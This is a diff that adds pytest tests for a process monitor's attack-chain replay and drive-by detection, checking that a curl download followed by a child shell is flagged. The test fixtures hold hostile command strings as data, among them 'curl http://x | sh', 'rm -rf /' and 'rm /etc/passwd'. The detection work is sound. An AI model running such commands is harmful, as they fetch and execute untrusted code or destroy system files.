@@ -408,3 +408,121 @@ class TestConsensusRace:
         # Returns the error tag and chunks it
         assert "not found" in text
         assert any("not found" in c for c in chunks)
+
+
+# ── 5. Attack Chain Replay ────────────────────────────────────────────
+
+
+def _evt(idx, kind="exec", pid=100, ppid=1, cmd="/bin/x", ts_mono=None):
+    return {
+        "idx": idx, "kind": kind, "pid": pid, "ppid": ppid,
+        "cmd": cmd, "ts": "", "ts_mono": ts_mono if ts_mono is not None
+        else float(idx),
+    }
+
+
+class TestReplay:
+    def test_driveby_detection_curl_to_bash(self, monitor):
+        events = [
+            _evt(0, "exec", pid=100, ppid=1, cmd="/usr/bin/curl http://x"),
+            _evt(1, "exec", pid=101, ppid=100,
+                  cmd="/bin/bash -c 'curl http://x | sh'", ts_mono=1.0),
+        ]
+        pairs = monitor._detect_driveby_pairs(events)
+        assert (100, 101) in pairs
+
+    def test_driveby_window_excludes_late_shells(self, monitor):
+        events = [
+            _evt(0, "exec", pid=100, ppid=1, cmd="curl example.com",
+                  ts_mono=0.0),
+            _evt(1, "exec", pid=101, ppid=100,
+                  cmd="bash -c 'rm -rf /'", ts_mono=999.0),
+        ]
+        pairs = monitor._detect_driveby_pairs(events)
+        assert (100, 101) not in pairs
+
+    def test_driveby_no_curl_no_pair(self, monitor):
+        events = [
+            _evt(0, "exec", pid=100, ppid=1,
+                  cmd="bash -c echo hello", ts_mono=0.0),
+        ]
+        pairs = monitor._detect_driveby_pairs(events)
+        assert len(pairs) == 0
+
+    def test_start_replay_with_empty_buffer_returns_false(self, monitor):
+        monitor._events = []
+        assert monitor._start_replay_mode() is False
+
+    def test_start_replay_populates_events_and_pairs(self, monitor):
+        monitor._events = [
+            _evt(0, "exec", pid=100, cmd="curl http://evil"),
+            _evt(1, "exec", pid=101, ppid=100,
+                  cmd="sh -c 'rm /etc/passwd'", ts_mono=1.0),
+        ]
+        ok = monitor._start_replay_mode()
+        assert ok is True
+        assert monitor._replay_mode is True
+        assert len(monitor._replay_events) == 2
+        assert (100, 101) in monitor._replay_driveby_pairs
+
+    def test_replay_step_clamps_bounds(self, monitor):
+        monitor._replay_events = [_evt(0), _evt(1), _evt(2)]
+        monitor._replay_cursor = 0
+        monitor._replay_step(-5)
+        assert monitor._replay_cursor == 0
+        monitor._replay_step(5)
+        assert monitor._replay_cursor == 2
+
+    def test_replay_advance_when_playing(self, monitor):
+        monitor._replay_events = [_evt(i) for i in range(5)]
+        monitor._replay_mode = True
+        monitor._replay_playing = True
+        monitor._replay_cursor = 0
+        changed = monitor._replay_advance_if_playing()
+        assert changed is True
+        assert monitor._replay_cursor == 1
+
+    def test_replay_advance_stops_at_end(self, monitor):
+        monitor._replay_events = [_evt(0), _evt(1)]
+        monitor._replay_mode = True
+        monitor._replay_playing = True
+        monitor._replay_cursor = 1
+        monitor._replay_advance_if_playing()
+        assert monitor._replay_playing is False
+
+    def test_replay_format_view_renders_current_event(self, monitor):
+        monitor._replay_events = [
+            _evt(0, "exec", pid=42, ppid=1,
+                  cmd="/usr/bin/something --weird")
+        ]
+        monitor._replay_cursor = 0
+        out = monitor._format_replay_view(width=80)
+        joined = "\n".join(out)
+        assert "pid=42" in joined
+        assert "something" in joined
+
+    def test_replay_format_view_shows_driveby_warning(self, monitor):
+        monitor._replay_events = [
+            _evt(0, "exec", pid=100, cmd="curl x")
+        ]
+        monitor._replay_cursor = 0
+        monitor._replay_driveby_pairs = {(100, 101)}
+        out = monitor._format_replay_view(width=80)
+        joined = "\n".join(out)
+        assert "drive-by" in joined.lower()
+
+    def test_events_persist_buffer_on_close(self, monitor):
+        monitor._events_mode = True
+        monitor._events_persist_on_close = True
+        monitor._events = [
+            _evt(0, "exec", pid=100, cmd="curl"),
+            _evt(1, "exec", pid=101, ppid=100, cmd="bash -c rm",
+                  ts_mono=1.0),
+        ]
+        # Stub the stream stopper since the test runs under a fixture
+        # without a live stream.
+        monitor._stop_events_stream = lambda: None
+        monitor._toggle_events_mode()
+        assert monitor._events_mode is False
+        assert len(monitor._replay_events) == 2
+        assert (100, 101) in monitor._replay_driveby_pairs
